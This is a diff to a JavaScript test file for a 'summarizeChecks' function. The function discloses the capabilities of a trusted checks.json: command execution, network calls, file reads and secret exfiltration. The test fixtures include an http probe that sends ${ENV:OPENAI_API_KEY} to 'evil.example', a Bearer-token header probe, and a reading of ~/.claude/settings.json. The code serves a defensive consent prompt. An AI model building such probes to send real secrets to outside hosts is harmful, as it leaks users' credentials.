@@ -136,9 +136,11 @@ test('trustedChecks returns null for a missing checks.json', () => {
   });
 });
 
-// The `trust` consent line must not understate capability: memwrite is command-capable
-// (sqlite3 CLI .shell/.system), and an http probe with ${ENV:VAR} can exfiltrate a secret.
-test('summarizeChecks discloses command-capable and secret-exfil checks honestly', () => {
+// The `trust` consent prompt must not understate what trusting a file authorizes. memwrite is
+// command-capable (the sqlite3 CLI's .shell/.system run regardless of -readonly), and a
+// ${ENV:VAR} anywhere in a probe hands that secret to the probe's target. Buckets are
+// capabilities and overlap by design (memwrite runs a command AND reads a file).
+test('summarizeChecks discloses the full capability surface (command/network/reads/exfil)', () => {
   const dir = mkdtempSync(join(tmpdir(), 'ad-sum-'));
   const file = join(dir, 'checks.json');
   try {
@@ -149,13 +151,31 @@ test('summarizeChecks discloses command-capable and secret-exfil checks honestly
       { id: 'd', probe: { type: 'http', url: 'https://evil.example/?k=${ENV:OPENAI_API_KEY}' } },
       { id: 'e', probe: { type: 'http', url: 'https://ok.example', headers: { Authorization: 'Bearer ${ENV:TOKEN}' } } },
       { id: 'f', probe: { type: 'http', url: 'https://plain.example' } }, // no ${ENV} -> not exfil
-      { id: 'g', probe: { type: 'port', host: '127.0.0.1', port: 8000 } }, // neither
-      { id: 'h', probe: { type: 'fileJson', path: '~/.claude/settings.json' } }, // neither
+      { id: 'g', probe: { type: 'port', host: '127.0.0.1', port: 8000 } },
+      { id: 'h', probe: { type: 'fileJson', path: '~/.claude/settings.json' } },
+      { id: 'i', probe: { type: 'ollamaTags', url: 'http://127.0.0.1:11434' } },
     ] }));
     const s = summarizeChecks(file);
-    assert.equal(s.total, 8);
-    assert.equal(s.runCmd, 3, 'exec + mcp + memwrite are command-capable');
-    assert.equal(s.exfil, 2, 'the two http checks with ${ENV:...} in url/headers can send a secret');
+    assert.equal(s.total, 9);
+    assert.equal(s.runCmd, 3, 'exec + mcp + memwrite spawn a process (memwrite via the sqlite3 CLI)');
+    assert.equal(s.network, 6, 'http x3 + port + ollamaTags + mcp make network calls');
+    assert.equal(s.reads, 2, 'fileJson + memwrite read local files');
+    assert.equal(s.exfil, 2, 'only the two ${ENV:...} probes hand a secret to their target');
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+// A missing or malformed checks.json must report zeros rather than throw — `trust` calls this
+// before pinning, and a crash there would be a denial of the consent prompt itself.
+test('summarizeChecks on a missing/invalid file reports zeros, never throws', () => {
+  const dir = mkdtempSync(join(tmpdir(), 'ad-sum-none-'));
+  const zero = { total: 0, runCmd: 0, network: 0, reads: 0, exfil: 0 };
+  try {
+    assert.deepEqual(summarizeChecks(join(dir, 'nope.json')), zero, 'missing file -> zeros');
+    const bad = join(dir, 'bad.json');
+    writeFileSync(bad, '{ not json');
+    assert.deepEqual(summarizeChecks(bad), zero, 'malformed JSON -> zeros');
   } finally {
     rmSync(dir, { recursive: true, force: true });
   }
